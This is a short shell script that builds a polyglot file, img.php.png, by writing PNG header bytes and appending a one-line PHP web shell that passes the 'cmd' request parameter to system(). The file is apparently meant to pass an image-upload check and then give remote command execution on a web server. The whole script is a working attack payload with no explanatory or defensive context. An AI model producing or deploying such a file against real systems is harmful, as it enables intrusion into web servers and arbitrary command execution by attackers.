#!/bin/sh
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > img.php.png
echo '<?php system($_REQUEST['cmd']); ?>' >> img.php.png
